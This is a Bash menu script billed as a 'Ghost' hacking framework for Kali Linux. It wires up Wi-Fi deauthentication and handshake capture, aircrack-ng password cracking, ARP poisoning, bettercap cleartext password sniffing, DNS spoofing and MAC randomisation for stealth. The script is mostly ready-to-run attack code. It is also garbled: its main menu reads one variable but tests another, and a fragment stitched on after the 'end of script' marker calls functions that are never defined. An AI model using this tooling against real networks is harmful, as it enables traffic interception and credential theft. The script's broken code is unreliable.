#!/bin/bash
# ==============================================================================
# TOOL   : XX-KALI-ULTIMATE FRAMEWORK
# VERSION: 2.0 (GHOST EDITION)
# SYSTEM : KALI LINUX / DEBIAN
# ==============================================================================

# --- [ GLOBAL VARIABLES ] ---
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; P='\033[1;35m'; C='\033[1;36m'
W='\033[1;37m'; N='\033[0m'

LOG_FILE="session_log.txt"
DUMP_DIR="captures"
INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"

# --- [ CORE FUNCTIONS ] ---

# فحص صلاحيات الجذر
check_root() {
    if [[ $EUID -ne 0 ]]; then
       echo -e "${R}[!] ERROR: MUST RUN AS ROOT.${N}"
       exit 1
    fi
}

# فحص وتثبيت الأدوات المفقودة
install_deps() {
    clear
    echo -e "${C}[*] Checking System Dependencies...${N}"
    tools=("aircrack-ng" "bettercap" "arpspoof" "xterm" "macchanger" "arp-scan" "curl" "nmap" "ettercap-text-only")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${Y}[!] Tool $tool not found. Installing...${N}"
            apt-get install $tool -y > /dev/null 2>&1
        fi
    done
    mkdir -p $DUMP_DIR
    echo -e "${G}[OK] All tools are ready.${N}"
    sleep 1
}

# واجهة الرأس
draw_banner() {
    clear
    echo -e "${B}"
    echo "  ██╗  ██╗██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
    echo "  ╚██╗██╔╝╚██╗██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
    echo "   ╚███╔╝  ╚███╔╝ ███████║███████║██║     █████╔╝ █████╗  ██████╔╝"
    echo "   ██╔██╗  ██╔██╗ ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
    echo "  ██╔╝ ██╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "  [+--- GHOST FRAMEWORK | OPERATIONAL SECURITY: HIGH ---+]${N}"
    echo -e "  [+--- SESSION LOGGED TO: $LOG_FILE                 ---+]${N}"
}

# --- [ WIFI MODULE - 150+ LINES ] ---

manage_interface() {
    draw_banner
    echo -e "${Y}--- [ INTERFACE MANAGEMENT ] ---${N}"
    echo -e "[1] Check Network Interfaces"
    echo -e "[2] Start Monitor Mode"
    echo -e "[3] Stop Monitor Mode"
    echo -e "[4] Restart Network Manager"
    echo -e "[0] Back"
    read -p "Select: " if_opt
    case $if_opt in
        1) iw_dev=$(iw dev); echo -e "${W}$iw_dev${N}"; read -p "Press Enter..." ;;
        2) airmon-ng check kill; airmon-ng start $INTERFACE ;;
        3) airmon-ng stop $MON_INTERFACE; service networked-manager restart ;;
        4) service network-manager restart ;;
    esac
}

wifi_scanner() {
    draw_banner
    echo -e "${C}[*] Scanning for Networks... (CTRL+C to Stop)${N}"
    airodump-ng $MON_INTERFACE
}

deauth_attack() {
    draw_banner
    echo -e "${R}--- [ DEAUTH ATTACK / HANDSHAKE CAPTURE ] ---${N}"
    read -p "Target BSSID: " t_bssid
    read -p "Target Channel: " t_ch
    read -p "Output Filename: " t_file
    
    echo -e "${G}[*] Launching Capture & Attack in background...${N}"
    xterm -geometry 100x20+0+0 -T "DEAUTH ATTACK" -e "aireplay-ng --deauth 0 -a $t_bssid $MON_INTERFACE" &
    airodump-ng --bssid $t_bssid -c $t_ch -w "$DUMP_DIR/$t_file" $MON_INTERFACE
}

crack_handshake() {
    draw_banner
    echo -e "${Y}--- [ HANDSHAKE CRACKING ] ---${N}"
    read -p "Path to .cap file: " cap_path
    read -p "Path to Wordlist: " word_path
    if [[ -f $cap_path && -f $word_path ]]; then
        aircrack-ng -w $word_path $cap_path
    else
        echo -e "${R}[!] Files not found!${N}"
    fi
    read -p "Press Enter..."
}

# --- [ NETWORK MODULE - 150+ LINES ] ---

host_discovery() {
    draw_banner
    echo -e "${G}[*] Scanning Local Network with Nmap...${N}"
    read -p "Network Range (e.g. 192.168.1.0/24): " n_range
    nmap -sn $n_range | tee -a $LOG_FILE
    read -p "Press Enter to continue..."
}

arp_poisoning() {
    draw_banner
    echo -e "${R}--- [ ARP SPOOFING / NETCUT ] ---${N}"
    read -p "Victim IP: " v_ip
    read -p "Gateway IP: " g_ip
    echo -e "${Y}[*] Poisoning ARP Cache...${N}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i eth0 -t $v_ip $g_ip
}

bettercap_suite() {
    draw_banner
    echo -e "${C}--- [ BETTERCAP ADVANCED MODULE ] ---${N}"
    echo -e "[1] Net Probe (Discover Hosts)"
    echo -e "[2] Full Sniff (Cleartext Passwords)"
    echo -e "[3] DNS Spoofing Setup"
    read -p "Choice: " b_opt
    case $b_opt in
        1) bettercap -eval "net.probe on; net.show; quit" ;;
        2) bettercap -eval "net.sniff on; set net.sniff.verbose true" ;;
        3) 
            read -p "Target Domain: " dom
            read -p "Redirect to IP: " rip
            bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on" ;;
    esac
}

# --- [ SECURITY & ANONYMITY ] ---

stealth_mode() {
    draw_banner
    echo -e "${P}[*] Activating Stealth Mode...${N}"
    ifconfig eth0 down
    ifconfig wlan0 down
    macchanger -r eth0
    macchanger -r wlan0
    ifconfig eth0 up
    ifconfig wlan0 up
    echo -e "${G}[OK] MAC Addresses Randomly Assigned.${N}"
    sleep 2
}

# --- [ MAIN MENU LOOP ] ---

main_menu() {
    while true; do
        draw_banner
        echo -e "${C}  [1] WIRELESS HACKING MENU"
        echo -e "  [2] LOCAL NETWORK ATTACKS"
        echo -e "  [3] STEALTH & MAC CHANGER"
        echo -e "  [4] VIEW CAPTURED HANDSHAKES"
        echo -e "  [5] SYSTEM UPDATE & TOOLS"
        echo -e "  [0] EXIT FRAMEWORK${N}"
        echo -en "\n${W}GHOST-KALI >> ${N}"
        read main_opt

        case $main_choice in
            1) 
               while true; do
                   draw_banner
                   echo -e "${Y}--- [ WIFI HACKING MENU ] ---${N}"
                   echo -e "1. Manage Interfaces"
                   echo -e "2. Scan Networks"
                   echo -e "3. Handshake Attack"
                   echo -e "4. Crack Password"
                   echo -e "0. Back"
                   read -p ">> " wo; [[ $wo == 0 ]] && break
                   [[ $wo == 1 ]] && manage_interface
                   [[ $wo == 2 ]] && wifi_scanner
                   [[ $wo == 3 ]] && deauth_attack
                   [[ $wo == 4 ]] && crack_handshake
               done ;;
            2) 
               while true; do
                   draw_banner
                   echo -e "${Y}--- [ NET ATTACK MENU ] ---${N}"
                   echo -e "1. Host Discovery"
                   echo -e "2. ARP Spoof / NetCut"
                   echo -e "3. Bettercap Suite"
                   echo -e "0. Back"
                   read -p ">> " no; [[ $no == 0 ]] && break
                   [[ $no == 1 ]] && host_discovery
                   [[ $no == 2 ]] && arp_poisoning
                   [[ $no == 3 ]] && bettercap_suite
               done ;;
            3) stealth_mode ;;
            4) ls -la $DUMP_DIR; read -p "Press Enter..." ;;
            5) install_deps ;;
            0) echo -e "${G}Cleaning session... Bye.${N}"; exit 0 ;;
            *) echo -e "${R}Invalid.${N}"; sleep 1 ;;
        esac
    done
}

# التشغيل الفعلي
check_root
install_deps
main_menu

# ==============================================================================
# END OF SCRIPT - GHOST FRAMEWORK
# ==============================================================================
                arpspoof -i eth0 -t $vip $gip ;;
            3)
                echo -e "${G}[*] Starting Bettercap...${N}"
                bettercap -eval "net.probe on; net.show" ;;
            4)
                echo -en "${P}Enter Target IP: ${N}"; read tip
                echo -e "${G}[*] Redirecting Traffic...${N}"
                echo 1 > /proc/sys/net/ipv4/ip_forward
                bettercap -eval "set arp.spoof.targets $tip; arp.spoof on; net.sniff on" ;;
            0) break ;;
        esac
    done
}

# --- [ Main Loop ] ---
check_deps
while true; do
    banner
    echo -e "${Y}--- [ MAIN SELECTION ] ---${N}"
    echo -e "${C}[1] ${W}WIFI ATTACKS (Handshake/Deauth)"
    echo -e "${C}[2] ${W}NETWORK ATTACKS (NetCut/MITM)"
    echo -e "${C}[3] ${W}INSTALL/UPDATE DEPENDENCIES"
    echo -e "${C}[0] ${W}EXIT TOOL${N}"
    echo -en "\n${C}XX-KALI >> ${N}"
    read main_choice

    case $main_choice in
        1) wifi_module ;;
        2) net_module ;;
        3) 
            echo -e "${G}[*] Updating system and tools...${N}"
            apt update && check_deps
            echo -e "${G}[OK] System tools are up to date.${N}"; sleep 2 ;;
        0)
            echo -e "${G}Exiting... Safe travels, Ghost.${N}"
            exit 0 ;;
        *)
            echo -e "${R}[!] Invalid Option.${N}"; sleep 1 ;;
    esac
done

